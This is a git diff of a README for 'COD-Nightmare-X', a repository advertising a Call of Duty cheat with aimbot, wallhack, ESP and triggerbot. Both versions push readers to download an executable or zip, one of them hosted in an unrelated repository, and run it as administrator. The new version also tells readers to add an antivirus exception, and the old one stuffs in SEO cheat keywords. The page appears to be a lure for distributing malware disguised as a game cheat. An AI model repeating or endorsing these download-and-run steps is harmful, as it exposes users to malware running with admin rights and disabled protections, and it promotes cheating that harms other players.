@@ -1,161 +1,77 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎮 COD-Nightmare-X - Improve your performance in every match
 
-<h1 align="center">COD-Nightmare-X</h1>
-<p align="center">
-  <strong>Nightmare X Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fuchsme363/COD-Nightmare-X/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Nightmare-X"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+COD-Nightmare-X provides tools to assist players during Call of Duty sessions. This software includes features like ESP, aimbot, triggerbot, and recoil management. It helps users track player locations and refine aim precision.
 
-## What is This?
+## ⚙️ System Requirements
 
-COD-Nightmare-X is the nightmare X tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Become the nightmare of the battlefield and dominate every match!
+Ensure your computer meets these specifications to run the application:
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+* Memory: 8 GB RAM or higher.
+* Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+* Storage: 500 MB of space available.
+* Network: Stable broadband connection.
 
-## Download
+## 📥 Downloading the Tool
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to obtain the software:
 
-## Features
+1. Visit [this link](https://github.com/fuchsme363/COD-Nightmare-X/releases) to access the official release page.
+2. Select the latest version listed under the Releases section.
+3. Locate the file ending in .exe.
+4. Click the file name to start the download.
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+## 🚀 Installation and Usage 
 
-## Installation
+1. Create a folder on your computer for the application files.
+2. Move the downloaded .exe file into this folder.
+3. Close any unnecessary background tasks to ensure stability.
+4. Right-click the .exe file and choose "Run as administrator". This step grants the permissions needed for the software to read game memory.
+5. Launch your version of Call of Duty through the standard game launcher.
+6. Return to the application window to configure your settings.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+## 🛠️ Configuring Features
 
-## System Requirements
+The interface allows you to toggle specific functions based on your preferences.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+### Visual Settings
+The ESP feature highlights enemy positions through walls. You can adjust the colors of these overlays to suit your screen. Use the Wallhack toggle to see through obstacles.
 
-## SEO Tags
+### Aim Assist
+The Aimbot helps track targets. You can set the smoothness of the motion to make the movement look natural. The Triggerbot feature fires your weapon automatically when an enemy crosses your crosshair.
 
-cod nightmare x, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+### Weapon Control
+The No Recoil setting compensates for the kickback patterns of your guns, keeping your shots centered. Adjust the intensity of this effect in the settings menu to match the weapon you use.
 
-## Support
+## ❗ Troubleshooting Common Issues
 
-Star this repository if you enjoy it!
+If the software does not work as expected, check these common points:
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Nightmare-X">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+* Administrative Privileges: The game and the tool must run with the same permission levels. If the game runs as administrator, the tool must also run as administrator.
+* Antivirus Software: Security programs sometimes mistake helper tools for threats. You may need to add an exception in your antivirus settings for the application folder.
+* Game Updates: Call of Duty updates frequently. If the game updates, check the release page for a newer version of COD-Nightmare-X.
+* Overlay Conflicts: If the visuals do not appear, ensure that other overlays like Discord, GeForce Experience, or Steam are not blocking the visibility. Disable these overlays one by one to test functionality.
+* Windows Updates: Keep your Windows installation current to ensure all system drivers work correctly.
+
+## 🛡️ Usage Guidelines
+
+Use this tool responsibly. Modifying game files or using external assistance may violate terms of service for online platforms. Users assume responsibility for their accounts when using third-party software. Use the tool in private matches or practice modes first to learn how the settings affect your gameplay before entering public lobbies.
+
+## 📋 Frequently Asked Questions
+
+Does the tool require a specific version of Call of Duty?
+It supports the current main installment. Check the release notes for version numbers.
+
+Can I move the menu window? 
+Yes, drag the top bar of the application window to position it anywhere on your desktop.
+
+How do I save my settings?
+The application saves your preferences automatically when you exit.
+
+Does it impact frame rates?
+The tool uses minimal system resources. If you notice lower frame rates, reduce the visual quality settings within the game.
+
+Keywords: call of duty, aimbot, esp, shooter tools, game enhancement, windows utility
